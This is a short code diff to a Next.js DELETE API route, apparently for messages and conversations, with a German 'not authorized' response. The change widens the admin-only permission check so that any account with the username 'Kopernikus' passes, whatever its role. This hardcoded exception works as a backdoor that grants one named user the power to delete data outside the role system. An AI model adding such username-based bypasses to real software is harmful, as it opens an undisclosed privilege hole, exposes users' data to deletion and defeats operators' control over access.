@@ -9,7 +9,7 @@ import { getMessagesCollection, getMessageConversationsCollection } from "@/lib/
 export async function DELETE(request: Request) {
   try {
     const account = await getServerAccount();
-    if (!account || (account.role !== "SUPERADMIN" && account.role !== "ADMIN")) {
+    if (!account || (account.role !== "SUPERADMIN" && account.role !== "ADMIN" && account.username !== "Kopernikus")) {
       return NextResponse.json({ message: "Nicht berechtigt." }, { status: 403 });
     }
 
